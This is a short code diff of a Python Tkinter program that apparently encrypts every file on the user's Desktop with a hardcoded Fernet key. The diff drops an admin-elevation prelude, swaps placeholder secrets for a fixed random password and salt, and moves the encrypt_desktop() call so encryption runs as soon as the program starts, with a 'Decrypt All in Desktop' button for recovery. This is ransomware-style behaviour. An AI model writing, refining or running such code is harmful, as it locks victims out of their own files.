@@ -1,25 +1,11 @@
-import ctypes
-import sys
 from tkinter import messagebox, simpledialog, Tk, Button
 from cryptography.hazmat.primitives.kdf.scrypt import Scrypt
 from cryptography.fernet import Fernet
 import base64
 import os
 
-def is_admin():
-    try:
-        return ctypes.windll.shell32.IsUserAnAdmin()
-    except:
-        return False
-
-if not is_admin():
-    ctypes.windll.shell32.ShellExecuteW(
-        None, "runas", sys.executable, " ".join(sys.argv), None, 1
-    )
-    sys.exit()
-
-SALT = b"password"
-PASSWORD = "password"
+SALT = b"TbhukHlLofdlONlslJwpqmdImwL"
+PASSWORD = "TbhukHlLofdlONlslJwpqmdImwL"
 
 def derive_key(password):
     try:
@@ -123,6 +109,6 @@ if __name__ == "__main__":
     decrypt_button = Button(root, text="Decrypt All in Desktop", command=decrypt_desktop)
     decrypt_button.pack(pady=10)
 
-    root.mainloop()
-
     encrypt_desktop()
+
+    root.mainloop()
